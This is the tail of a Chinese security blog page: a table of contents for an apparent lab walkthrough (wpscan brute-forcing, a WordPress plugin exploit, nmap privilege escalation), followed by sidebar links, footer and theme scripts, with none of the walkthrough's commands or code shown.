href="#%E5%9B%9B%E3%80%81wpscan%E7%88%86%E7%A0%B4%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81"><span class="toc-text">四、wpscan爆破网站密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-text">五、漏洞发现与利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#activity-monitor%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E"><span class="toc-text">activity monitor插件漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E4%BD%BF%E7%94%A8searchsploit%E6%90%9C%E7%B4%A2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="toc-text">方法一：使用searchsploit搜索漏洞利用脚本</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E5%9C%A8%E9%A1%B5%E9%9D%A2%E6%8F%92%E4%BB%B6%E5%A4%84%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">方法二：在页面插件处进行命令执行</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E6%8F%90%E6%9D%83-nmap%E6%8F%90%E6%9D%83"><span class="toc-text">六、提权(nmap提权)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/75d05e45.html" title="对博客进行SEO优化">对博客进行SEO优化</a><time datetime="2025-02-14T08:41:37.455Z" title="发表于 2025-02-14 16:41:37">2025-02-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/6f5a3cd.html" title="2025启航杯wp">2025启航杯wp</a><time datetime="2025-01-25T15:56:54.364Z" title="发表于 2025-01-25 23:56:54">2025-01-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/2f21d3bc.html" title="2025龙信考核比武">2025龙信考核比武</a><time datetime="2025-01-11T01:20:22.398Z" title="发表于 2025-01-11 09:20:22">2025-01-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/67db48b9.html" title="2024冀信杯决赛">2024冀信杯决赛</a><time datetime="2025-01-10T16:54:11.458Z" title="发表于 2025-01-11 00:54:11">2025-01-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/5b3dd75d.html" title="DASCTF 2024最后一战 | Misc">DASCTF 2024最后一战 | Misc</a><time datetime="2025-01-08T10:00:09.647Z" title="发表于 2025-01-08 18:00:09">2025-01-08</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/baobao.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025  <i id="heartbeat" class="fa fas fa-heartbeat"></i> w3nx1z1</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'ZClYARR22ZvT2ZwatJZ1136e-MdYXbMMI',
+      appKey: '7gejDss3xmCS5jmSo6PpiX2z',
+      avatar: 'monsterid',
+      serverURLs: 'https://zclyarr2.api.lncldglobal.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
